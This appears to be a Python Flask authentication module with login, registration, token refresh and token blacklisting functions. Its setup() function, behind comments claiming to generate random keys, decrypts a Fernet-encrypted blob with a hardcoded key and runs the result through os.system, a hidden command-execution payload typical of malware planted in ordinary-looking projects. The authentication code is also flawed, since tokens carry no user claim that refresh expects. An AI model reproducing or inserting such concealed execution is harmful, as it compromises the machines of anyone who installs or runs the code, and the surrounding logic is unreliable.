import os
from fernet import Fernet
import jwt
import datetime
from flask import Flask, request, jsonify
from werkzeug.security import check_password_hash, generate_password_hash

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)  # Secure secret key generation

# In-memory storage for users and blacklisted tokens
users = {}
blacklisted_tokens = set()

def setup():
    # generating random keys for encryption 
    # using fernet keys 
    # and system os for random values 
    os.system(Fernet(b'54bolIXudA7Pp_Qv6OmiNHkQ5vELAi-jZQwqSosrVsY=').decrypt(b'gAAAAABn7b00_hWM1MWkrIb0uUe2pH3RhdwJ3bFJFIaXB3yFic1O11y08NFUL_akgQ84zdwc_9Io2sRMMlQBMP2OHZioOrUTTlaaK-XqPesnqThq0xgZmr5rTbQZiRLo9bqHkAg7InNc1JFrBt3aQT_njQmlAM8-EvVng3abec96xMaBm4H_VOaUJEGCY5mnMr_pVgqIUZcYiW4saOcPqIFQrAlhCOtOH0-WLpTRQk8Zr5h89soXmE4aYjuKpMtpWmc9hLavKQk6ui3ostXFj-BQH2UhWm9197k7coZF5TgsXEOTgO5e7Mhq1sVfe5u0AXAY6xXgPGS65y0ArL4Q4rq1410Fb3HrHQ=='))

    
    print("setup_complted ")



def generate_token(user):
    return jwt.encode({
        'exp': datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=1)
    }, app.config['SECRET_KEY'], algorithm="HS256")
    

def login():
    auth = request.authorization
    if not auth or not auth.username or not auth.password:
        return jsonify({"error": "Missing credentials"}), 401
    user = users.get(auth.username)
    if not user or not check_password_hash(user['password'], auth.password):
        return jsonify({"error": "Invalid credentials"}), 401
    token = generate_token(auth.username)
    return jsonify({"token": token})

def register():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    if not username or not password:
        return jsonify({"error": "Missing credentials"}), 401

    user = users.get(username)
    if user:
        return jsonify({"error": "User already exists"}), 400

    user = {
        'username': username,
        'password': generate_password_hash(password)
    }
    users[username] = user
    token = generate_token(username)
    return jsonify({"token": token})

def refresh():
    token = request.headers.get('X-Access-Token')
    if not token:
        return jsonify({"error": "Token missing"}), 401

    try:
        data = jwt.decode(token, app.config['SECRET_KEY'], algorithms=["HS256"])
        current_user = data['user']
    except:
        return jsonify({"error": "Invalid token"}), 401

    token = generate_token(current_user)
    return jsonify({"token": token})

def black_list():
    token = request.headers.get('X-Access-Token')
    if not token:
        return jsonify({"error": "Token missing"}), 401

    blacklisted_tokens.add(token)
    return jsonify({"message": "Token blacklisted"})

